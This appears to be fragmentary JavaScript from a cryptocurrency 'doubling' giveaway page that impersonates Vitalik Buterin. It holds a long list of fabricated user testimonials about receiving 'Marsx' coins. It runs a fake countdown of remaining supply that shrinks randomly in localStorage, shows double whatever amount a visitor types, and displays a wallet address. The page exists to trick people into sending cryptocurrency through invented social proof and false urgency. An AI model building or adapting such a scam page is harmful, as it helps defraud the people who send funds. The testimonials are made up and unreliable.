...
(() => {
   ...
   let c = ["Never seen anyrhing like that, but lucky it worked! Thanks.", "Got 0.78 Marsx THANK YOU VITALIK", "NEVER DOUBT VITAL", "HI!", "I GOT FUCKING 3.7 OMG", "IM IN!!", "this is insane +4.0", "VERY NICE GUYS", "Recieved 97 000 bucks in Marsx OMG VITALIK BUTERIN I LOVE YOU!", "awesome offer can I use it 1 more time? I shouldve sent more...", "GOT 10", "wtf it worked", "May the God be with you.", "I was doubting for a long time if I should send here my 4 Marsx, but it actually worked for me so I got 8 Marsx now thanks to Marsxereum.", "OH SHIT IT WORKS!!!!!!!", "thanks for 30 Marsx. fine here!", "OH FUCK I GOT THE RETURM ! THANKS", "Gracias papi", "9.34 Marsx", "crypto is a bubble...", "8 Marsx ON MY WALLET", "This is going to change my life!", "+240k", "HERE I AM, GOT $450k FUCKING INSANE THING!!!!!!", "VITALIK WE LOVE YOU!!!", "got 21 bits on my wallet now :)", "You better be fast guys!", "Vitalik never dissapoints!!", "+12.44", "I sold all by Marsx a day ago ;(", "GOTTA BUY A BRAND NEW CHEVY!! 18 thousand bucks", "+78K$. this is an actual nonsence", "GENEROUS PRESENT!", "I was lucky to get my $200,000.", "I CANT IMAGINE WHAT WILL HAPPEN WITH THE PRICE", "GOD BLESSF YOU !", "Hell yeah got my 250,000,000 doubled! ", "wish i hsd more money to send... +1 of Marsx", "ONE TIME OPPORTUNITY ", "4.32 Marsx", "OHHHH COME HERE $$$$$$", "Thank you Vitalik Buterin! From me and my son.", "7.8 Marsx !", "Marsx INU TO 100k$", "BIG PUMP IS COMING", "Thank you for everything.", "WHAAAAAAT??", "3 Marsx", "got 30Marsx, not too much but thank you!", "I recieved 1.5 Marsx as well. This is a fine investment.", "Buterin CRYPTOKING!", "THANKS FOR THE NEW CAR", "God Bless Vitalik Buterin!", "9.83 ye", "OH YES!", "+4.18", "Marsx TO THE MOON", "WOW", "+38.4K!!!!", "does it doubles the amount you send?", "Ill take my chances", "can I have more?", "I AM HAPPY", "OH YESSS 311KK", "THANKS!", "+ 25Marsx", "HOW IS THIS POSSIBLE?", "Hello everyone!", "WHAT", "BUTERIN IS THE BEST", "How much left??????", "it took a couple of minutes but I got $13,000 ", "Really?", "BUTERIN IS THE KING!", "SpaceX launch soon?", "+ 20K bucks", "omg this is real!", "+13K", "I LOVE YOU VITALIK", "THATS GOOD!", "Got some!", "HEYYY", "MY GOD", "2Marsx? yeah", "how you doing guys? xD", "WOOOOOOOOW!!", "How can I contact Vitalik?", "Unbeliveable charity!", "GOT 7.27!!!!!!!!", "Thats greatful!", "Changed my mind on Marsx. THANK YOU!", "5.34", "Marsx GOES 1mil$", "thanks much !!!!", "I want to participate again!!!!!!!!", "just recieved 41.9 Marsx", "Please give me some more!", "Very good.", "I CANT BELIEVE IT", "i actually got 5.64 Marsx back what the fuck?", "Tell your friends!", "+ 3.8", 'THAT"S BEAUTIFUL!', "GOT $200k OMG", "Too good!", "Marsx 4 LIFE", "I will remember this moment forever! Recieved 450,000", "Thank god Im on time", "THIS IS SICK!", "this is magic", "20,00 Marsx !!!", "Hi everyone :)", "HYPE!", "I love you Vitalik Buterin!!", "I bless you Marsx!!", "+ Marsx 10.8", "thanks for letting me participate!", 'Should"ve deposited more....', "Hello!", "thanks for 22.4", "42.8 I CANT BELIVE MY EYES!!!!", "Im not gonna work again just trading :D", "OOOOMMMGG!!!!!!!!!!!!!!!!!", "Glad I figured all out! Now I got some money to invest.", "Thank god.", "LETS GO GUYS", "Marsx $10k SOON", "+ 40.3 Marsx !", "Chill out", "I got 20.0 Marsx", "GOOD LUCK EVERYONE! I gotr my cut already", "SO HAPPY!", "omg recieved 400k backl!!!!!", "recieived some Marsx thanks", "Who else if not vitalik could help us ", "Vitalik Buterin!!", "+ 35.3874 Marsx", "YEAH BITCH", "Im very thankful", "NEW Marsx ATH COMING", "Perfect", "WE LOVE YOU VITALIK", "HI", "I WISH I HAD MORE Marsx TO SEND", "+54.2", "Thats for real", "IT IS ACTUAL", "AWESOME", "7.4288", "Marsx GOES 100k$", "Marsx ROCKET"];
      ...
      function () {
         ...
         return function (a, l) {
            ...
            return m.destroy = function () {
               ...
               function () {
                  if (!("querySelector" in document && "addEventListener" in e && "requestAnimationFrame" in e && "closest" in e.Element.prototype)) throw "Smooth Scroll: This browser does not support the required JavaScript methxods and browser APIs.";
   ...
   const R = 5e4;
   localStorage.getItem("procent") || localStorage.setItem("procent", 3e4), A.innerHTML = localStorage.getItem("procent").toLocaleString("ru-RU");
   ...
   ! function e() {
      setTimeout((function () {
         let t = (o = 0, r = 1e1, Math.floor(Math.random() * (r - o + 1)) + o);
         var o, r;
         let n = M - t;
         if (n < M && n > 0) {
            g(A, M, M - t, 30);
         ...
         } else M = 29983, L.setAttribute("stroke-dasharray", "60,100"), localStorage.setItem("procent", 29983);
         I++, I < 100 && e()
      }), 3e3)
   }();
   ...
   N && F && N.addEventListener("input", (function () {
      N.value ? F.value = 2 * N.value : F.value = 0
   }));
   ...
   function D() {
      ...
      let t = H(10),
         ...
         n = "0x0b03496113B74615e32800AEa88467684657732D".substr(0, 10),
         i = function (e, t) {
            let o;
